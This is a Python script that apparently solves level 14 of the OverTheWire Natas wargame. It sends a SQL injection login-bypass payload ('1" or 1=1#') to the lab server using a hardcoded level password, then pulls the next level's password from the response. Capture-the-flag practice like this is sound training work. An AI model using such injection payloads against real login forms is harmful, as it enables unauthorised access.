# Vulnerability: SQL Injection

import requests
import re
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style

# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)

# Set the username and password for authentication
username = 'natas14'
password = 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'

# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'

# SQL Injection Payload
data = {"username": '1" or 1=1#', "password": '1" or 1=1#'}

# Perform a POST request to the specified URL with authentication credentials
resp = requests.post(url=url, auth=(username, password), data=data)

# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')

if "Successful login!" in str(soup):
    print(f"Natas 15: {re.search('natas15 is (.*)V', soup.text).group(1)}")
else:
    print("Error Occurred")
